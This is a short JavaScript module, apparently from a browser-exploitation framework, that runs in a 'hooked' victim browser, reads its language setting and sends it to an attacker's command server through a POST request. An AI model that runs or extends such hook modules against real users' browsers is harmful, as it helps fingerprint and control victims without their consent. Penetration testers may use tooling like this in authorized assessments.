/*
Module to return language of the hooked browser
*/

(function getLanguage() {
    let formData = new FormData();
    formData.append('result', navigator.language || navigator.userLanguage);
    formData.append('module_value', 'language.js')

    fetch(`http://${server}/command/result_listener`, {
        method: "POST",
        mode: 'cors',
        credentials: "include",
        body: formData
    })
})()